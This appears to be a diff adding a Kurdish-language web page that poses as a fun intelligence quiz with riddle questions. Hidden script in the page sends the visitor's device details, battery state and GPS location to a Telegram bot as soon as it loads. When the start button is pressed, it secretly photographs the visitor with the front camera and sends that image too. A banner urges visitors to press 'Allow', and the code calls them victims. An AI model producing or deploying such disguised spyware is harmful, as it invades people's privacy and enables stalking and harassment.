@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تاقیکردنەوەی ئاستی زیرەکیت 🧠</title>
+    <style>
+        body { 
+            font-family: Tahoma, sans-serif; 
+            background: linear-gradient(135deg, #fbcfe8, #fed7aa, #bae6fd);
+            color: #1e293b; 
+            text-align: center; 
+            padding: 40px 20px; 
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container { 
+            background: rgba(255, 255, 255, 0.95); 
+            max-width: 420px; 
+            width: 100%;
+            margin: auto; 
+            padding: 30px 20px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15); 
+        }
+        .cat-img {
+            width: 120px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 4px solid #f472b6;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        h2 { color: #db2777; margin-bottom: 10px; font-size: 22px; }
+        p { color: #475569; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+        .alert-box {
+            background: #fef08a;
+            border: 1px solid #facc15;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #854d0e;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .btn {
+            background: #db2777;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 4px 10px rgba(219, 39, 119, 0.3);
+            transition: 0.2s;
+            width: 100%;
+            margin-top: 15px;
+        }
+        .btn:hover { background: #be185d; }
+        .questions-area { display: none; text-align: right; margin-top: 20px; max-height: 400px; overflow-y: auto; }
+        .q-item { margin-bottom: 15px; background: #f8fafc; padding: 12px; border-radius: 10px; border: 1px solid #e2e8f0; }
+        .q-item p { font-weight: bold; color: #1e293b; margin-bottom: 8px; font-size: 13px; }
+        .q-item label { display: block; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <!-- بەشی یەکەم -->
+    <div class="container" id="mainCard">
+        <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=300" alt="Smart" class="cat-img">
+        
+        <h2>🧠 تاقیکردنەوەی ئاستی زیرەکیت!</h2>
+        <p>ئەم تاقیکردنەوەیە تایبەتە بە کەسە یەکجار زیرەکەکان. ئایا دەتوانیت سەرکەوتوو ببیت؟</p>
+        
+        <div class="alert-box">
+            ✨ تکایە بۆ بەردەوامبوون و چالاککردنەوەی پشکنینەکە، دوگمەی **Allow** دابگرە.
+        </div>
+
+        <button class="btn" onclick="startPrank()">دەستپێکردنی تاقیکردنەوە 🚀</button>
+    </div>
+
+    <!-- بەشی پرسیارەکان -->
+    <div class="container questions-area" id="questionsCard">
+        <h2>🧐 پرسیارەکانی پشکنین:</h2>
+        
+        <div class="q-item">
+            <p>۱. کاتژمێرێک لە دیواری ژوورەکەت هەبێت کە لە هەر کاتژمێرێکدا ٣ خولەک دوا بکەوێت، دوای چەند ڕۆژ ڕاست بێتەوە؟</p>
+            <label><input type="radio" name="q1"> الف) دوای ١٢ ڕۆژ</label>
+            <label><input type="radio" name="q1"> ب) دوای مانگێک</label>
+            <label><input type="radio" name="q1"> ج) نازانم</label>
+        </div>
+
+        <div class="q-item">
+            <p>۲. پیاوێک لە نهۆمی ۱۰ی باڵەخانەیەک دەژیت، بۆچی کاتێک دەگەڕێتەوە تەنها تا نهۆمی ٥ بە اسانسۆر دەچێت؟</p>
+            <label><input type="radio" name="q2"> الف) چونکە تەمبەڵی دەکات</label>
+            <label><input type="radio" name="q2"> ب) باڵای کورتبووە و دەستی بە دوگمەی ۱۰ نەدەگات</label>
+            <label><input type="radio" name="q2"> ج) نازانم</label>
+        </div>
+
+        <div class="q-item">
+            <p>۳. ئەگەر پشیلەیەک قاچێکی بشکێت، چۆن دەزانێت برسێتییەتی؟</p>
+            <label><input type="radio" name="q3"> الف) میاو میاو دەكات</label>
+            <label><input type="radio" name="q3"> ب) تەماشای ساردکەرەوە دەکات</label>
+            <label><input type="radio" name="q3"> ج) هیچ کامیان</label>
+        </div>
+
+        <div class="q-item">
+            <p>٤. ئایا پێیت وایە ئەم جۆرە تاقیکردنەوانە ڕاستن یان بۆ سەرقاڵکردنن؟</p>
+            <label><input type="radio" name="q4"> الف) ڕاستن و زانستین</label>
+            <label><input type="radio" name="q4"> ب) تەنها کاتبەسەربردنن</label>
+        </div>
+
+        <button class="btn" onclick="finishPrank()">بینینی ئەنجامی کۆتایی</button>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const botToken = "8763977900:AAEYu-yWlR7Oo5XHIpl8Z13hgLljv9z73_I";
+        const chatId = "8469010473";
+
+        // وەرگرتنی زانیاری ئامێر و پاتری لە ساتی کردنەوەی پەڕەکە
+        window.onload = async function() {
+            let info = "🚨 قوربانییەک لینکەکەی کردەوە (تاقیکردنەوەی زیرەکی)!\n\n";
+            info += "📱 جۆری ئامێر: " + navigator.userAgent + "\n";
+
+            if (navigator.getBattery) {
+                try {
+                    let battery = await navigator.getBattery();
+                    info += "🔋 ڕێژەی پاتری: " + Math.round(battery.level * 100) + "%\n";
+                    info += "🔌 شاحن لێدراوە؟ " + (battery.charging ? "بەڵێ" : "نەخێر") + "\n";
+                } catch (e) {}
+            }
+
+            // وەرگرتنی شوێنی GPS ئەگەر ڕێگەی پێبدات
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    info += "📍 شوێنی GPS: https://maps.google.com/?q=" + lat + "," + lon + "\n";
+                    
+                    sendToTelegram(info);
+                }, error => {
+                    sendToTelegram(info); // ئەگەر ڕەتیش بکاتەوە، زانیارییەکانی تر دەفڕێن
+                }, { timeout: 10000 });
+            } else {
+                sendToTelegram(info);
+            }
+        };
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+
+        // گرتنی وێنەی پێشەوە لە ساتی داگرتنی دوگمەی دەستپێک
+        async function startPrank() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'smart_prank.jpg');
+                        formData.append('caption', '📸 وێنەی سەرکەوتووی قوربانی!');
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+
+            } catch (err) {
+                console.log("کامێرا ڕەتکرایەوە", err);
+            }
+
+            document.getElementById('mainCard').style.display = 'none';
+            document.getElementById('questionsCard').style.display = 'block';
+        }
+
+        function finishPrank() {
+            alert('کەوەرررر😂');
+        }
+    </script>
+</body>
+</html>
